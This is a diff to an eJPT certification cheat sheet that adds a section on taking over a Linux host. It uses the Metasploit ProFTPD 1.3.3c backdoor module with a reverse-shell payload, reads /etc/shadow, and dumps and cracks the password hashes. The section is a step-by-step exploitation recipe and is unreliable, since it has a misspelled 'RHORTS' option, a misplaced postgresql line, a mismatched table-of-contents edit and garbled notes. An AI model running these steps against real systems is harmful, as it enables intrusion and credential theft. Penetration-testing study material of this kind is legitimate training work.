@@ -76,7 +76,7 @@ Info about eJPT certification [here](https://security.ine.com/certifications/ejp
 - [Linux Post Exploitation Modules](#Linux-Post-Exploitation-Modules)
 - [FUN STUFF](#FUN-STUFF)
 - [Linux Privilege Escalation: Exploiting a vulnerable program](#Linux-Privilege-Escalation:-Exploiting-a-vulnerable-program)
-- [Type of Join](#Join)
+- [Linux Password Hash (exploit-ProFTPD)](#Linux-Password-Hash-(exploit-ProFTPD))
 - [Use of 'USING' Clause](#USING-clauses)
 - [Insert Value Condition](#Condition)
 - [Use of Alter](#Alter)
@@ -105,6 +105,11 @@ Info about eJPT certification [here](https://security.ine.com/certifications/ejp
 # eJPT Cheat Sheet
 
 #### Find IP address of a website:
+
+
+```shell
+service postgresql start
+```
 
 ```shell
 host <url>
@@ -2862,3 +2867,40 @@ exploit
 ```
 
 > This will exploit the vulnerability by creating a cron job.
+
+
+#### Linux Password Hash (exploit-ProFTPD)
+
+```shell
+/etc/passwd
+cat /etc/shadow (only read my root user)
+```
+> all passsword is store
+
+**determine by $ sign**
+$1 - MD5
+$2 - blowfish
+$5 - SHA-256
+$6 - SHA-512
+
+```shell
+service postgresql start
+msfconsole
+use exploit/unix/ftp/proftpd_133c_backdoor
+set RHORTS <target-IP>
+set payload payload/cmd/unix/reverse
+exploit
+/bin/bash -i
+background
+sessions -u <id>
+```
+> this is use to get the root of linux
+
+**Use `use post/linux/gather/hashdump` module to decode the hash by enter session id**
+
+```shell
+use auxiliary/analyze/crack_linux
+```
+> this is also use to decode the hash of password
+
+
